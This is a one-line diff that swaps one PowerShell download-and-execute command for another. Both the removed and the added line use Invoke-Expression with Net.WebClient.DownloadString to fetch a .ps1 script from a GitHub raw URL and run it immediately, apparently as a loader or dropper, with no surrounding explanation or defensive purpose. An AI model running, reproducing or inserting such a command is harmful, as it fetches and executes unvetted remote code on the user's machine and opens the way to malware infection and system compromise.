@@ -1,1 +1,1 @@
-iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AnatolyPivder/ryur/refs/heads/main/r.ps1'))                                           
+iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AnatolyPivder/mod_pository/refs/heads/main/mod.ps1'))                                           
